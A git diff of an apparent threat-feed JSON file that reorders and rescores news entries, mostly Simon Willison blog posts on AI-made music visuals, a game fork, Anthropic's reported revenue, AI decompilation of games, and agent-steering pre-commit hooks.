-      "summary": "DE STAAT - FREEDOM (Official Music Video) OK well this is a first for me... at 00:44 in this new music video by Dutch alternative rock band De Staat: The visual effects are credited to Matties Grooten of Fake it or Leave it. Via flir on Hacker News Tags: music, ai, generative-ai, pelican-riding-a-bicycle",
-      "tags": [],
-      "title": "DE STAAT - FREEDOM (Official Music Video)",
-      "url": "https://simonwillison.net/2026/Oct/22/de-staat-freedom/"
     },
     {
       "appsec": false,
@@ -4405,6 +4365,46 @@
       "tags": [],
       "title": "Srsly Risky Biz: Bring on the AI lawsuits",
       "url": "https://risky.biz/SRB184a/"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
+      "id": "af381dd3420f5f37",
+      "kev": false,
+      "published": "2026-10-22T15:34:13Z",
+      "score": 8.1,
+      "score_reasons": [
+        "source:Simon Willison (+6)",
+        "recency (+2.1)"
+      ],
+      "source": "Simon Willison",
+      "source_type": "news",
+      "summary": "As fun as AI is, we built so much bad software over the last 30 years, and now the universe is punishing us for our sins. — Armin Ronacher Tags: security, generative-ai, armin-ronacher, ai, ai-security-research, llms",
+      "tags": [],
+      "title": "Quoting Armin Ronacher",
+      "url": "https://simonwillison.net/2026/Oct/22/armin-ronacher/"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
+      "id": "e44aa2efb3cde31e",
+      "kev": false,
+      "published": "2026-10-22T19:42:26Z",
+      "score": 8.1,
+      "score_reasons": [
+        "source:Simon Willison (+6)",
+        "recency (+2.1)"
+      ],
+      "source": "Simon Willison",
+      "source_type": "news",
+      "summary": "DE STAAT - FREEDOM (Official Music Video) OK well this is a first for me... at 00:44 in this new music video by Dutch alternative rock band De Staat: The visual effects are credited to Matties Grooten of Fake it or Leave it. Via flir on Hacker News Tags: music, ai, generative-ai, pelican-riding-a-bicycle",
+      "tags": [],
+      "title": "DE STAAT - FREEDOM (Official Music Video)",
+      "url": "https://simonwillison.net/2026/Oct/22/de-staat-freedom/"
     },
     {
       "appsec": false,
@@ -5171,26 +5171,6 @@
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "9a6f4ea76a26e005",
-      "kev": false,
-      "published": "2026-10-21T16:25:16Z",
-      "score": 8.0,
-      "score_reasons": [
-        "source:Simon Willison (+6)",
-        "recency (+2.0)"
-      ],
-      "source": "Simon Willison",
-      "source_type": "news",
-      "summary": "Panache — RTS Belle Époque pour mobile Well this is delightful: I released Battle Drones yesterday under an Apache 2.0 License and there's already a French language fork by Gabriel Turpin which reskins the game to take place in steampunk 1900s France and adds an animated intro! Panache est un jeu de stratégie en temps réel pour mobile et navigateur, dans la France de la Belle Époque (vers 1900) : dirigeables, Fardiers à vapeur, Creusot cuirassés, automates en képi, Gargantua la forteresse marchante — et beaucoup de panache. You can play Panache here - it's worth clicking that link just to experience the new intro video. So far it's mostly just aesthetic updates as opposed to gameplay changes. The music has had a French twist added to it as well. The new steampunk models are so cool! Here's a page with the original Battle Drones models and that same page with the new Panache alternatives. This is a comparison of the original and the new design for the Goliath: Via @Meffysto69 Tags: game-design, open-source",
-      "tags": [],
-      "title": "Panache — RTS Belle Époque pour mobile",
-      "url": "https://simonwillison.net/2026/Oct/21/panache/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
       "id": "9ba8683bc2bd8878",
       "kev": false,
       "published": "2026-08-17T04:52:58Z",
@@ -5647,13 +5627,33 @@
       "cves": [],
       "epss": null,
       "feed": "news",
+      "id": "9a6f4ea76a26e005",
+      "kev": false,
+      "published": "2026-10-21T16:25:16Z",
+      "score": 7.9,
+      "score_reasons": [
+        "source:Simon Willison (+6)",
+        "recency (+1.9)"
+      ],
+      "source": "Simon Willison",
+      "source_type": "news",
+      "summary": "Panache — RTS Belle Époque pour mobile Well this is delightful: I released Battle Drones yesterday under an Apache 2.0 License and there's already a French language fork by Gabriel Turpin which reskins the game to take place in steampunk 1900s France and adds an animated intro! Panache est un jeu de stratégie en temps réel pour mobile et navigateur, dans la France de la Belle Époque (vers 1900) : dirigeables, Fardiers à vapeur, Creusot cuirassés, automates en képi, Gargantua la forteresse marchante — et beaucoup de panache. You can play Panache here - it's worth clicking that link just to experience the new intro video. So far it's mostly just aesthetic updates as opposed to gameplay changes. The music has had a French twist added to it as well. The new steampunk models are so cool! Here's a page with the original Battle Drones models and that same page with the new Panache alternatives. This is a comparison of the original and the new design for the Goliath: Via @Meffysto69 Tags: game-design, open-source",
+      "tags": [],
+      "title": "Panache — RTS Belle Époque pour mobile",
+      "url": "https://simonwillison.net/2026/Oct/21/panache/"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
       "id": "8481bd4a6647667c",
       "kev": false,
       "published": "2026-10-19T23:58:25Z",
-      "score": 7.7,
+      "score": 7.6,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+1.7)"
+        "recency (+1.6)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -5707,26 +5707,6 @@
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "812f894cec2b2135",
-      "kev": false,
-      "published": "2026-10-15T13:04:03Z",
-      "score": 7.1,
-      "score_reasons": [
-        "source:Simon Willison (+6)",
-        "recency (+1.1)"
-      ],
-      "source": "Simon Willison",
-      "source_type": "news",
-      "summary": "Anthropic tells investors quarterly revenue up nearly 50% to $16.8bn ahead of IPO The phrase \"told investors\" appears four times in this FT article, which reports on Anthropic's day of hosting investors on Wednesday. Lots of details in here from \"people with knowledge of the matter\". Key things I learned from the article: Q1 revenue (Jan/Feb/Mar) was \"about $4.8bn\" Q2 (Apr/May/Jun) was $11.5bn Q3 (Jul/Aug/Sep) was $16.8bn In Q3: $1.70 in revenue for every $1 spent on \"computing power\" Adjusted operating margins (excluding stock-based compensation) were 11% This point about distillation is worth quoting in full (highlight mine): The start-up has also clamped down on “distillation” — a controversial practice whereby rival AI labs train their models on the outputs of more advanced ones. When rival companies “distil” their models from Anthropic’s models, that involves heavy usage and spending. Anthropic told investors on Wednesday distillation accounted for 5 per cent to 7 per cent of revenue and that they had cut it back “materially” in the third quarter of the year, said four people with direct knowledge of the matter. Napkin maths says that if distillation was 5% of their Q2 revenue (before they cut it back in Q3) then unnamed \"other labs\" spent over half a billion dollars distilling Anthropic's models in that quarter! Also notable: Anthropic appear to no longer be leaning on \"annualized run-rate revenue\" (previously) in these communications to their investors. Tags: ai, generative-ai, llms, anthropic",
-      "tags": [],
-      "title": "Anthropic tells investors quarterly revenue up nearly 50% to $16.8bn ahead of IPO",
-      "url": "https://simonwillison.net/2026/Oct/15/anthropic-tells-investors/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
       "id": "96935c790ddc2990",
       "kev": false,
       "published": "2026-10-15T19:47:52Z",
@@ -5747,9 +5727,9 @@
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "512e526f527e6705",
+      "id": "812f894cec2b2135",
       "kev": false,
-      "published": "2026-10-14T16:26:53Z",
+      "published": "2026-10-15T13:04:03Z",
       "score": 7.0,
       "score_reasons": [
         "source:Simon Willison (+6)",
@@ -5757,19 +5737,19 @@
       ],
       "source": "Simon Willison",
       "source_type": "news",
-      "summary": "AI is mass decompiling games. That's both awesome and scary. Indie game developer Popcar talks about the recent wave of AI-powered decompilation of existing games, enabling weird mashups between existing games, and producing a boom in game preservation projects to get old games working on new hardware (often in a browser using WebAssembly). I like how this piece captures both the positives and the negatives of this new development: Most people already realized the scary part by now. If AI can decompile games and software, then the entire tech industry is about to explode. Anybody can decompile other software and use it any way they'd like, and nobody can stop them. Companies can steal from competitors. Your paid game or app can be open-sourced against your will. This isn't exclusive to old video games, we can apply this to any software. [...] This is also a big win for preservation. Old games can be ported, modified, enhanced, and made much more easily accessible than before. [...[ With console makers going all in on digital and games becoming entirely unplayable due to servers shutting down, this is fantastic news. We could own software we bought regardless of what the company thinks. Via Hacker News Tags: computer-history, game-design, ai, webassembly, generative-ai, llms, ai-ethics, coding-agents",
+      "summary": "Anthropic tells investors quarterly revenue up nearly 50% to $16.8bn ahead of IPO The phrase \"told investors\" appears four times in this FT article, which reports on Anthropic's day of hosting investors on Wednesday. Lots of details in here from \"people with knowledge of the matter\". Key things I learned from the article: Q1 revenue (Jan/Feb/Mar) was \"about $4.8bn\" Q2 (Apr/May/Jun) was $11.5bn Q3 (Jul/Aug/Sep) was $16.8bn In Q3: $1.70 in revenue for every $1 spent on \"computing power\" Adjusted operating margins (excluding stock-based compensation) were 11% This point about distillation is worth quoting in full (highlight mine): The start-up has also clamped down on “distillation” — a controversial practice whereby rival AI labs train their models on the outputs of more advanced ones. When rival companies “distil” their models from Anthropic’s models, that involves heavy usage and spending. Anthropic told investors on Wednesday distillation accounted for 5 per cent to 7 per cent of revenue and that they had cut it back “materially” in the third quarter of the year, said four people with direct knowledge of the matter. Napkin maths says that if distillation was 5% of their Q2 revenue (before they cut it back in Q3) then unnamed \"other labs\" spent over half a billion dollars distilling Anthropic's models in that quarter! Also notable: Anthropic appear to no longer be leaning on \"annualized run-rate revenue\" (previously) in these communications to their investors. Tags: ai, generative-ai, llms, anthropic",
       "tags": [],
-      "title": "AI is mass decompiling games. That's both awesome and scary.",
-      "url": "https://simonwillison.net/2026/Oct/14/ai-is-mass-decompiling-games/"
+      "title": "Anthropic tells investors quarterly revenue up nearly 50% to $16.8bn ahead of IPO",
+      "url": "https://simonwillison.net/2026/Oct/15/anthropic-tells-investors/"
     },
     {
       "appsec": false,
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "aa7677223a5c7914",
+      "id": "512e526f527e6705",
       "kev": false,
-      "published": "2026-10-13T13:32:00Z",
+      "published": "2026-10-14T16:26:53Z",
       "score": 6.9,
       "score_reasons": [
         "source:Simon Willison (+6)",
@@ -5777,10 +5757,10 @@
       ],
       "source": "Simon Willison",
       "source_type": "news",
-      "summary": "If the agent isn't using my diagnostics library, I could introspect and update AGENTS.md, but there's still a delta, and it'll drift. Instead, I write a pre-commit hook that checks the git diff for direct calls to observability modules that bypass my diagnostics module. Boom: fail the commit, inject a prompt telling the agent to use the diagnostics library. All of a sudden it's ten out of ten. — Geoffrey Huntley, nobody should type code by hand anymore. here's what's left. Tags: coding-agents, generative-ai, git, agentic-engineering, ai, geoffrey-huntley, llms",
+      "summary": "AI is mass decompiling games. That's both awesome and scary. Indie game developer Popcar talks about the recent wave of AI-powered decompilation of existing games, enabling weird mashups between existing games, and producing a boom in game preservation projects to get old games working on new hardware (often in a browser using WebAssembly). I like how this piece captures both the positives and the negatives of this new development: Most people already realized the scary part by now. If AI can decompile games and software, then the entire tech industry is about to explode. Anybody can decompile other software and use it any way they'd like, and nobody can stop them. Companies can steal from competitors. Your paid game or app can be open-sourced against your will. This isn't exclusive to old video games, we can apply this to any software. [...] This is also a big win for preservation. Old games can be ported, modified, enhanced, and made much more easily accessible than before. [...[ With console makers going all in on digital and games becoming entirely unplayable due to servers shutting down, this is fantastic news. We could own software we bought regardless of what the company thinks. Via Hacker News Tags: computer-history, game-design, ai, webassembly, generative-ai, llms, ai-ethics, coding-agents",
       "tags": [],
-      "title": "Quoting Geoffrey Huntley",
-      "url": "https://simonwillison.net/2026/Oct/13/geoffrey-huntley/"
+      "title": "AI is mass decompiling games. That's both awesome and scary.",
+      "url": "https://simonwillison.net/2026/Oct/14/ai-is-mass-decompiling-games/"
     },
     {
       "appsec": false,
@@ -5801,9 +5781,29 @@
       "tags": [],
       "title": "Redesigning source control at Anthropic",
       "url": "https://simonwillison.net/2026/Oct/13/redesigning-source-control-at-anthropic/"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
+      "id": "aa7677223a5c7914",
+      "kev": false,
+      "published": "2026-10-13T13:32:00Z",
+      "score": 6.8,
+      "score_reasons": [
+        "source:Simon Willison (+6)",
+        "recency (+0.8)"
+      ],
+      "source": "Simon Willison",
+      "source_type": "news",
+      "summary": "If the agent isn't using my diagnostics library, I could introspect and update AGENTS.md, but there's still a delta, and it'll drift. Instead, I write a pre-commit hook that checks the git diff for direct calls to observability modules that bypass my diagnostics module. Boom: fail the commit, inject a prompt telling the agent to use the diagnostics library. All of a sudden it's ten out of ten. — Geoffrey Huntley, nobody should type code by hand anymore. here's what's left. Tags: coding-agents, generative-ai, git, agentic-engineering, ai, geoffrey-huntley, llms",
+      "tags": [],
+      "title": "Quoting Geoffrey Huntley",
+      "url": "https://simonwillison.net/2026/Oct/13/geoffrey-huntley/"
     }
   ],
-  "last_run": "2026-11-11T05:30:28Z",
+  "last_run": "2026-11-11T13:58:28Z",
   "repo": "builtbybrayden/threat-feed",
   "stats": {
     "actively_exploited_appsec": 1326,
